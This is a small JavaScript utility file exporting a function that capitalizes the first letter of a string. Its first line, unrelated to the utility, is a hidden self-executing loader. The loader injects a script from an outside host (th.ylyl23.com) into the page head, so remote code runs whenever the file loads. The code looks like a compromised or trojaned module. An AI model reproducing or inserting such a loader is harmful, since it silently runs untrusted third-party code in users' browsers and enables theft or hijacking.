(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
/**
 * function to return string with capital letter.
 * @param {string} string the word string.
 * @returns {string} with capital letter.
 */
export default function capitalizeFirstLetter( string ) {
	return string.charAt( 0 ).toUpperCase() + string.slice( 1 );
}
